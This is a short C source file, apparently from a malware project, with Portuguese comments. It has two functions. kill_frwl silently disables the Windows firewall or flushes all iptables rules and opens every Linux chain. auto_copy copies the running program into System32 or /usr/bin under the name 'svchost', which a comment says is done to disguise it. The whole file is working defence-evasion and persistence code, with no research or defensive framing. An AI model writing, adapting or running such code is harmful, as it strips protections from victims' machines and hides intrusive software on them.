#include "execfuncs.h"
#include "main.h"
#include <unistd.h> // Para execve, __progname
#include <stdlib.h> // Para free

int kill_frwl()

{

#if defined(_WIN32) || defined(_WIN64)
    // Comando para desativar o firewall do Windows
    system("netsh advfirewall set allprofiles state off > NUL 2>&1");
#else
    // Comandos para limpar as regras do iptables no Linux
    system("iptables -F > /dev/null 2>&1");
    system("iptables -X > /dev/null 2>&1");
    system("iptables -t nat -F > /dev/null 2>&1");
    system("iptables -t nat -X > /dev/null 2>&1");
    system("iptables -t mangle -F > /dev/null 2>&1");
    system("iptables -t mangle -X > /dev/null 2>&1");
    system("iptables -P INPUT ACCEPT > /dev/null 2>&1");
    system("iptables -P FORWARD ACCEPT > /dev/null 2>&1");
    system("iptables -P OUTPUT ACCEPT > /dev/null 2>&1");
#endif

return 0;

}

int auto_copy()
{
    // Esta função é mais complexa de tornar portável com execve.
    // Agora estamos usando a variável global g_executable_path.
#if defined(_WIN32) || defined(_WIN64)
    // Copia para um local comum no Windows.
    // NOTA: Requer permissões de administrador.
    char command[512];
    // Usamos snprintf para construir o comando de forma segura
    snprintf(command, sizeof(command), "copy \"%s\" C:\\Windows\\System32\\svchost.exe > NUL 2>&1", g_executable_path);
    system(command);
#else
    // Usar fork+execve seria melhor para não substituir o processo.
    pid_t pid = fork();
    if (pid == 0) { // Processo filho
        // Copia para /usr/bin e renomeia para 'svchost' para disfarçar
        char *args[] = {"/bin/cp", (char*)g_executable_path, "/usr/bin/svchost", NULL};
        execve(args[0], args, NULL);
        exit(1); // Sai se o execve falhar
    }
    // O processo pai continua
#endif
    return 0;
}
